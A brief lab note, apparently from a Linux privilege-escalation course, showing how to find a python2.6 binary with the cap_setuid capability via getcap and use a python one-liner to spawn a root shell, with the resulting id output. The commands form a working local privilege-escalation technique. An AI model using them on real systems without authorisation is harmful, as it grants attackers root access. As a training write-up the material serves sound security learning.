#cap

- Find out the files with capabalities permission which have everything permitted. 
```
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
```

- Use that permitted file to get root. Since, here it is python so, python script will be used. 
```
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```